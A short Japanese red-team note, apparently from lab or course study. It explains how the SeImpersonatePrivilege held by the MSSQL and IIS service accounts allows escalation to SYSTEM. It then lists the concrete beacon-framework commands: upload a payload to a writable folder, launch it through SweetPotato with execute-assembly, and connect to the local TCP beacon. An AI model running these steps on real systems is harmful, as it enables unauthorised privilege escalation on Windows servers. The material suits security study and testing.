## SeImptersonatePrivilege
### 前提：NT Service\MSSQLSERVERとは

```
NT Service\MSSQLSERVER
├─ ローカル仮想アカウント（Virtual Account）
├─ ネットワークリソースへはコンピューターアカウント（CONTOSO\LON-DB-2$）として接続
├─ ローカル管理者権限は持たない
└─ ただし SeImpersonatePrivilege が付与されている ← これが問題
```

IISのアプリケーションプールなど、他のサービスアカウントも同様の状態になっていることが多いです。

### SeImpersonatePrivilegeとは

**「別のユーザーのトークンを借用（Impersonate）してよい」** という権限です。

本来の用途はサービスがクライアントの権限でファイルアクセス等を行うための正当な仕組みですが、**SYSTEMプロセスのトークンを借用できれば権限昇格が成立**します。

MSSQLやIISでは仮想アカウントによくこの権限が設定されている

### 悪用方法
SweetPotatoを利用した権限昇格

ペイロードの配置場所に行く
MSSQLSERVERアカウントが書き込み権限を持つ数少ないパスのひとつ
```
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
```

ペイロードアップロード
```
upload C:\Payloads\tcp-local_x64.exe
```

実行
```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```

TCP BeaconにローカルのTCPで接続
```
connect localhost 1337
```